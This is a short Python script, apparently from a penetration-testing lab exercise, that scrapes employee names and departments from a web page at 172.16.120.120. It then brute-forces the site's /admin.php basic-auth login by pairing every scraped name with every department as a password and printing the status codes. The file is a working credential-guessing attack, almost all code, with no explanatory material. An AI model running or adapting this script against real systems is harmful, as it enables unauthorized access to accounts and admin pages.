#!/usr/bin/env python3

from bs4 import BeautifulSoup
import http.client
import requests
import base64


#HOST = "127.0.0.1"
#PORT = "80"

try:
	conn = http.client.HTTPConnection("172.16.120.120")
	conn.request("GET", "/")
	r1 = conn.getresponse()

	if(r1.status == 200):
		data1 = r1.read() # return entire content
		#print(data1)

		# BeautifulSoup
		soup = BeautifulSoup(data1, 'html.parser')
		print(soup.prettify())
		print("-------------------")

		usrlist = soup.find_all("td", {"id":"name"})
		dptlist = soup.find_all("td", {"id":"department"})

		j = int("0")
		for i in usrlist:
			
			# remove tags
			usrlist[j] = i.text
			dptlist[j] = dptlist[j].text

			print(usrlist[j],",",dptlist[j])
			j+=1

		# brute force admin page
		for i in usrlist:
		
			for k in dptlist:
			
				response = requests.get("http://172.16.120.120/admin.php", auth=(i, k))
				print("Pair:",i ,"," ,k,",",str(response.status_code))
			

	else:
		print(r1.status, r1.reason)

except ConnectionRefusedError:
	print("Connection Failed")
	
